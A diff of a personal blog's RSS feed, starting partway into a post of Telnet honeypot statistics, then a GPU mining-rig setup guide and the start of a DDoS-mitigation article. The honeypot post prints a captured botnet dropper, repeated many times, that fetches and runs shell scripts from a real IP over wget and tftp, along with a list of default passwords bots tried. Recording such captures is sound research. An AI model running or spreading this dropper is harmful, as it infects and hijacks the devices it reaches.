+wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bin</code></pre></div>
+<p>What really surprises me on these stats are the constant active sessions (185) that these C2s are keeping on telnet devices even if the device is a fake honeypot that records any command. <br>
+I'm still looking for a cool wget to analyze and have fun in a sandboxed enviroment but till today only old wgets and common commands are getting into the honeypot. <br>
+<br><br>
+Link to project: <a href="https://github.com/fnzv/YAFH">https://github.com/fnzv/YAFH</a></p>]]></description><link>https://sami.pw/blog/2017-12-31-Some-fun-stats-running-telnet</link><guid isPermaLink="false">https://sami.pw/blog/2017-12-31-Some-fun-stats-running-telnet</guid><pubDate>Sun, 31 Dec 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Telnet sessions:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;netstat -peanut | grep 23 | grep ESTABLISHED | wc -l
+185&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;Total connection recieved last month:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;grep CONNECTION yafh-telnet.log  | wc -l
+644&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;Most common wget/busybox attempt (Dont run it...i implemented accidental copy-pasta protection here #):&lt;br&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;# /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne &amp;#39;\x0181c46036\x7f&amp;#39;; /bin/busybox printf &amp;#39;\00281c46036\177&amp;#39;; /bin/echo -ne &amp;#39;\x0381c46036\x7f&amp;#39;; /usr/bin/printf &amp;#39;\00481c46036\177&amp;#39;; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;Top 15 password used (The honeypot was designed to allow any password access):&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt; &amp;lt;empty&amp;gt; 
+ 1234
+ password
+ admin
+ 12345
+ 1234
+ Win1doW$
+ user
+ pass
+ aquario (??Really??)
+ admin
+ 888888
+ 7ujMko0admin
+ 666666
+ 5up
+ 54321
+ 1234567890
+ 123456
+ 1111
+ 12345&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;One-liner of the year goes to:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin
+wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin
+wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin
+wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;What really surprises me on these stats are the constant active sessions (185) that these C2s are keeping on telnet devices even if the device is a fake honeypot that records any command. &lt;br&gt;
+I&apos;m still looking for a cool wget to analyze and have fun in a sandboxed enviroment but till today only old wgets and common commands are getting into the honeypot. &lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+Link to project: &lt;a href=&quot;https://github.com/fnzv/YAFH&quot;&gt;https://github.com/fnzv/YAFH&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Setting up your first Mining rig (Using Ubuntu 16.04 LTS Server)]]></title><description><![CDATA[<p><img src="https://cryptoyeti.com/wp-content/uploads/2016/10/mining-zcash-326x245.png"></p>
+<p>Since a few months i started getting more and more interested in crypto and now i can share my experience with Mining. <br>
+<br>
+At the very beginning of Mining many were attracted by Bitcoin since the difficulty was so low that everyone with some spare GPUs could start and be an active node of the Bitcoin network and earn some satoshi, Nowadays this is still a thing but the miners have evolved and investors came into the game with huge datacenters full of ASICs/13 GPU rigs dedicated to mining a single coin and boosting the difficulty to the very top causing low budget miners to shutoff their rigs since you cannot make any profits with just a bunch of GPUs.<br>
+What happened next? Different coins started becoming profitable and allowing more GPU owners to jump into the mining game using another cryptocurrency like Ethereum, Zcash, Ethereum Classic, Monero.. and many others, if you ever noticed GPU prices this summer you probably saw that the value of AMD/Nvidia GPUs was incredibly high and the European/American market started struggling finding those cards as "Mining Whales" started buying 300-400 cards per order making Hobbist/Gamers life harder.<br></p>
+<p>Ok cool, now i see that Ethereum/Zcash/Monero/...Coin xyz... is still PoW(Proof of Work) and i can mine coins till end of 20xx how can i start mining? <br>
+First of all you need to consider that mining takes a lot of energy at least 80-140W per card depending on under/overclock settings so if your electrical system cannot sustain the draw of all the total energy you cannot start mining there.<br>
+After you have made your elettrical considerations you can start setting up your Mining rig, the only components necessary for mining are:<br></p>
+<ul>
+<li>Multiple GPUs: Depending on the algorithm you need to choose the best Hashrate per Watt, for example if you want to mine only Zcash the best GPUs for this coins are Nvidia because of their hardware architecture (Pascal) that is much more <br>
+effective with coins like Zcash whereas on AMD cards you will perform better on Ethereum coins (Just look for AMD RX 4xx/5xx vs Nvidia GTX 10XX benchmaks and see the Hashrate per Watt differences).</li>
+<li>Motherboard: This is a key choice because will decide how many GPU cards can you fit into a single rig, the best option are BTC edition (MoBo that were designed for BTC mining) because they can fit up to 6-13 PCI-e slots <br></li>
+<li>CPU: The only requirement for the CPU is that supports the Motherboard socket but in case you want to start CPU mining then you need to search for the most appropriate CPU and rethink about the Motherboard.</li>
+<li>PSU: Another important choice is the power supply not only for the connectors (if you have 5 or more GPUs you need to take into account that you need 5 PCI power connectors and another 5 for the Risers) but also for Watt and efficiency.
+Don't be cheap on the quality and take only Gold/Silver/Platinum PSUs. <br>
+<br></li>
+<li>Storage: SSD drives today are cheap and draw less power than standard HD, you need up to 60GB depending on the mined coin and if you need to store the complete Blockchain.<br>
+<br></li>
+<li>Risers: Those connectors allow you to fit multiple GPUs into the single motherboard because you cannot keep 6+ GPUs directly connected on the motherboard so you need to extend the PCI-e adapter.<br>
+Important consideration: Risers (Sata or Molex) must be feed from different cables and not all from the same PSU cable because of Amperage can burn connectors as they can only draw less than 70W, what you can do:<br>
+4 GPUs --> Directly connected to PSU PCI-e power connectors (example: 2 cables from PSU with 2 PCI-e power connectors)<br>
+4 Risers --> converted to Sata --> 2 PSU sata cables  (NO MORE THAN 2 SATA CABLES PER POWER CABLE FROM PSU)<br>
+The best option should be one cable per Riser connector/GPU but for this you will end up having at least 2-3 PSUs, many people say that the limit is 2-3 cables on the same power cable coming from PSU.<br>
+<br>
+After you got all the hardware you just need to connect all the hardware (If you don't have experience you can google how to build a pc and basically it's the same thing), you need to choose your OS:<br></li>
+<li>EthOS - Mining distro based on Ubuntu with all drivers/mining scripts ready<br></li>
+<li>SMOS - Mining OS much like EthOS<br></li>
+<li>Pure Windows - Install the OS and check for the correct GPU drivers and use MSIAfterburner or EVGA Precision for overclocking (Some have issues with Windows 10 and have switched to 7 for driver stability)<br></li>
+<li>Ubuntu 16.04 - If you have some Linux experience this is your best option, you need only to install/compile the correct drivers and start mining<br>
+<br>
+<br>
+<br>
+Setting Up your Ubuntu 16.04 Miner (Nvidia):<br>
+Adding the Graphics repository<br><br></li>
+</ul>
+<p><code class="language-text">sudo apt-add-repository ppa:graphics-drivers/ppa</code><br><br></p>
+<p>Installing the drivers and Nvidia SMI<br><br></p>
+<p><code class="language-text">sudo apt-get install nvidia-smi</code><br>
+<code class="language-text">sudo apt-get install nvidia-384</code><br>
+<br><br>
+** To correctly run Nvidia Drivers you must install startx and configure the GPUs with "Fake" Screens as on Ubuntu 16.04 LTS Server there is no gui.. (Files that you should configure are /root/.xinitrc for OC settings and /etc/X11/xorg.conf for "Fake" screens attached to GPUs)<br> <br>
+Now you just have to choose your miner and mining pool to start mining (I assume you already have a Wallet for the coin you want to mine).<br>
+Examples:<br>
+<br>
+EWBF Miner --> Zcash<br>
+Ethminer --> Ethereum<br>
+ccminer --> Monero<br>
+<br><br></p>
+<p>Most of those scripts have examples inside them so you need only to change Wallet/Pool settings:<br><br></p>
+<p>EWBF:<br>
+0.3.4b/miner --server POOL-ADDRESS --user WALLET-ADDRESS.RIG-NAME --pass z --port 3333 --pec --log 2 --logfile /var/log/ewbf.log --tempunits C --templimit 85<br>
+<br>
+To start mining you just have to start the mining script (under a screen session to keep the script active even when you close terminal) and keep an eye on GPU,connectors temps (green zone is 50-70, warning zone 70-80 but still ok, critical zone 80-90, gpu lock/driver automatically stops 90-100) .<br><br></p>
+<p>Some of the most known mining pools are:<br></p>
+<ul>
+<li><a href="https://nanopool.org">https://nanopool.org</a><br></li>
+<li><a href="http://dwarfpool.com/">http://dwarfpool.com/</a><br></li>
+<li><a href="https://zcash.flypool.org/">https://zcash.flypool.org/</a><br></li>
+<li><a href="https://ethermine.org/">https://ethermine.org/</a><br></li>
+<li><a href="http://nicehash.com/">http://nicehash.com/</a><br>
+<br>
+Almost every mining pool will allow you to see statistics via web &#x26; or alerting via email if miner shuts down.<br>
+<br>
+You can also set up your own pool but it does make sense only if you have enough hashrate, for example if you have 1-5 rigs just go for a shared mining pool whereas if you have 20+ rigs you can start thinking about solo mining so all profits are maximized. <br>
+<br><br></li>
+</ul>
+<p>Remote Control is quite easy, since this is a Linux based system you can Portforward SSH ports on your Router and enable SSH-Key authentication for remote management (Filter IP ranges with IPtables if you know that you will connect only from provier X). <br>
+Other alternatives are:<br></p>
+<ul>
+<li>OpenVPN on rig --> PortForward OpenVPN ports --> Connect via Android Device to VPN --> SSH OR Miner API managemnt via VPN.
+<br></li>
+<li>Telegram Bot listening for you commands and sends you information about the miner (for example trsh script: <a href="https://github.com/fnzv/trsh">https://github.com/fnzv/trsh</a> --> create custom commands for example /gpu_stats --> gives back to you gpu statistics)
+<br></li>
+<li>Setting up a VPN with your Router then from there connect to your rig (OpenWRT,DD-WRT &#x26; co..)
+<br></li>
+<li>... your own backdoor :)</li>
+</ul>
+<p><br><br>
+After you are up and running just HODL and keep mining</p>]]></description><link>https://sami.pw/blog/2017-10-07-Setting-up-a-cryptocurrency-miner</link><guid isPermaLink="false">https://sami.pw/blog/2017-10-07-Setting-up-a-cryptocurrency-miner</guid><pubDate>Sat, 07 Oct 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;https://cryptoyeti.com/wp-content/uploads/2016/10/mining-zcash-326x245.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Since a few months i started getting more and more interested in crypto and now i can share my experience with Mining. &lt;br&gt;
+&lt;br&gt;
+At the very beginning of Mining many were attracted by Bitcoin since the difficulty was so low that everyone with some spare GPUs could start and be an active node of the Bitcoin network and earn some satoshi, Nowadays this is still a thing but the miners have evolved and investors came into the game with huge datacenters full of ASICs/13 GPU rigs dedicated to mining a single coin and boosting the difficulty to the very top causing low budget miners to shutoff their rigs since you cannot make any profits with just a bunch of GPUs.&lt;br&gt;
+What happened next? Different coins started becoming profitable and allowing more GPU owners to jump into the mining game using another cryptocurrency like Ethereum, Zcash, Ethereum Classic, Monero.. and many others, if you ever noticed GPU prices this summer you probably saw that the value of AMD/Nvidia GPUs was incredibly high and the European/American market started struggling finding those cards as &quot;Mining Whales&quot; started buying 300-400 cards per order making Hobbist/Gamers life harder.&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Ok cool, now i see that Ethereum/Zcash/Monero/...Coin xyz... is still PoW(Proof of Work) and i can mine coins till end of 20xx how can i start mining? &lt;br&gt;
+First of all you need to consider that mining takes a lot of energy at least 80-140W per card depending on under/overclock settings so if your electrical system cannot sustain the draw of all the total energy you cannot start mining there.&lt;br&gt;
+After you have made your elettrical considerations you can start setting up your Mining rig, the only components necessary for mining are:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Multiple GPUs: Depending on the algorithm you need to choose the best Hashrate per Watt, for example if you want to mine only Zcash the best GPUs for this coins are Nvidia because of their hardware architecture (Pascal) that is much more &lt;br&gt;
+effective with coins like Zcash whereas on AMD cards you will perform better on Ethereum coins (Just look for AMD RX 4xx/5xx vs Nvidia GTX 10XX benchmaks and see the Hashrate per Watt differences).&lt;/li&gt;
+&lt;li&gt;Motherboard: This is a key choice because will decide how many GPU cards can you fit into a single rig, the best option are BTC edition (MoBo that were designed for BTC mining) because they can fit up to 6-13 PCI-e slots &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;CPU: The only requirement for the CPU is that supports the Motherboard socket but in case you want to start CPU mining then you need to search for the most appropriate CPU and rethink about the Motherboard.&lt;/li&gt;
+&lt;li&gt;PSU: Another important choice is the power supply not only for the connectors (if you have 5 or more GPUs you need to take into account that you need 5 PCI power connectors and another 5 for the Risers) but also for Watt and efficiency.
+Don&apos;t be cheap on the quality and take only Gold/Silver/Platinum PSUs. &lt;br&gt;
+&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Storage: SSD drives today are cheap and draw less power than standard HD, you need up to 60GB depending on the mined coin and if you need to store the complete Blockchain.&lt;br&gt;
+&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Risers: Those connectors allow you to fit multiple GPUs into the single motherboard because you cannot keep 6+ GPUs directly connected on the motherboard so you need to extend the PCI-e adapter.&lt;br&gt;
+Important consideration: Risers (Sata or Molex) must be feed from different cables and not all from the same PSU cable because of Amperage can burn connectors as they can only draw less than 70W, what you can do:&lt;br&gt;
+4 GPUs --&gt; Directly connected to PSU PCI-e power connectors (example: 2 cables from PSU with 2 PCI-e power connectors)&lt;br&gt;
+4 Risers --&gt; converted to Sata --&gt; 2 PSU sata cables  (NO MORE THAN 2 SATA CABLES PER POWER CABLE FROM PSU)&lt;br&gt;
+The best option should be one cable per Riser connector/GPU but for this you will end up having at least 2-3 PSUs, many people say that the limit is 2-3 cables on the same power cable coming from PSU.&lt;br&gt;
+&lt;br&gt;
+After you got all the hardware you just need to connect all the hardware (If you don&apos;t have experience you can google how to build a pc and basically it&apos;s the same thing), you need to choose your OS:&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;EthOS - Mining distro based on Ubuntu with all drivers/mining scripts ready&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;SMOS - Mining OS much like EthOS&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Pure Windows - Install the OS and check for the correct GPU drivers and use MSIAfterburner or EVGA Precision for overclocking (Some have issues with Windows 10 and have switched to 7 for driver stability)&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Ubuntu 16.04 - If you have some Linux experience this is your best option, you need only to install/compile the correct drivers and start mining&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+Setting Up your Ubuntu 16.04 Miner (Nvidia):&lt;br&gt;
+Adding the Graphics repository&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt-add-repository ppa:graphics-drivers/ppa&lt;/code&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Installing the drivers and Nvidia SMI&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt-get install nvidia-smi&lt;/code&gt;&lt;br&gt;
+&lt;code class=&quot;language-text&quot;&gt;sudo apt-get install nvidia-384&lt;/code&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+** To correctly run Nvidia Drivers you must install startx and configure the GPUs with &quot;Fake&quot; Screens as on Ubuntu 16.04 LTS Server there is no gui.. (Files that you should configure are /root/.xinitrc for OC settings and /etc/X11/xorg.conf for &quot;Fake&quot; screens attached to GPUs)&lt;br&gt; &lt;br&gt;
+Now you just have to choose your miner and mining pool to start mining (I assume you already have a Wallet for the coin you want to mine).&lt;br&gt;
+Examples:&lt;br&gt;
+&lt;br&gt;
+EWBF Miner --&gt; Zcash&lt;br&gt;
+Ethminer --&gt; Ethereum&lt;br&gt;
+ccminer --&gt; Monero&lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Most of those scripts have examples inside them so you need only to change Wallet/Pool settings:&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;EWBF:&lt;br&gt;
+0.3.4b/miner --server POOL-ADDRESS --user WALLET-ADDRESS.RIG-NAME --pass z --port 3333 --pec --log 2 --logfile /var/log/ewbf.log --tempunits C --templimit 85&lt;br&gt;
+&lt;br&gt;
+To start mining you just have to start the mining script (under a screen session to keep the script active even when you close terminal) and keep an eye on GPU,connectors temps (green zone is 50-70, warning zone 70-80 but still ok, critical zone 80-90, gpu lock/driver automatically stops 90-100) .&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Some of the most known mining pools are:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://nanopool.org&quot;&gt;https://nanopool.org&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://dwarfpool.com/&quot;&gt;http://dwarfpool.com/&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://zcash.flypool.org/&quot;&gt;https://zcash.flypool.org/&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://ethermine.org/&quot;&gt;https://ethermine.org/&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://nicehash.com/&quot;&gt;http://nicehash.com/&lt;/a&gt;&lt;br&gt;
+&lt;br&gt;
+Almost every mining pool will allow you to see statistics via web &amp;#x26; or alerting via email if miner shuts down.&lt;br&gt;
+&lt;br&gt;
+You can also set up your own pool but it does make sense only if you have enough hashrate, for example if you have 1-5 rigs just go for a shared mining pool whereas if you have 20+ rigs you can start thinking about solo mining so all profits are maximized. &lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Remote Control is quite easy, since this is a Linux based system you can Portforward SSH ports on your Router and enable SSH-Key authentication for remote management (Filter IP ranges with IPtables if you know that you will connect only from provier X). &lt;br&gt;
+Other alternatives are:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;OpenVPN on rig --&gt; PortForward OpenVPN ports --&gt; Connect via Android Device to VPN --&gt; SSH OR Miner API managemnt via VPN.
+&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Telegram Bot listening for you commands and sends you information about the miner (for example trsh script: &lt;a href=&quot;https://github.com/fnzv/trsh&quot;&gt;https://github.com/fnzv/trsh&lt;/a&gt; --&gt; create custom commands for example /gpu_stats --&gt; gives back to you gpu statistics)
+&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Setting up a VPN with your Router then from there connect to your rig (OpenWRT,DD-WRT &amp;#x26; co..)
+&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;... your own backdoor :)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;
+After you are up and running just HODL and keep mining&lt;/p&gt;</content:encoded></item><item><title><![CDATA[How to detect & mitigate (D)DoS Attacks using FastNetMon]]></title><description><![CDATA[<p><img src="https://raw.githubusercontent.com/fnzv/fnzv.github.io/5653b21f4114429a5bddf86aaed7891fb3a1e542/imgs/ddos-warz.gif">
+Recently i was researching a lot on the various denial of service attacks and how to mitigate them from Layer 1 to 7 and as always the most convinient way to stop any attacks is keeping the bad requests/traffic away from your services starting from the first layers of the ISO/OSI model.<br></p>
+<h4>Realistically the only ways to prevent DDoS attacks are:<br></h4>
+<p>a) Layer 3-4 mitigation with <strong>BGP/Cloud</strong> Scrubbing (Sending all your network traffic using BGP or 'sophisticated' VPNs to third-party POP's to delegate attack mitigation).<br></p>
+<ul>
+<li>Pros: This is the only and smart way to properly mitigating attacks, your services won't be hit by attacks/malicious traffic.</li>
+<li>Cons: Paying an External Provider &#x26; bandwidth costs, All your traffic is re-routed so latency, packetloss and any other network issue that could happen to the External Provider affects you directly....And yes there could be false positives and customers may be locked out of their services.<br><br><br></li>
+</ul>
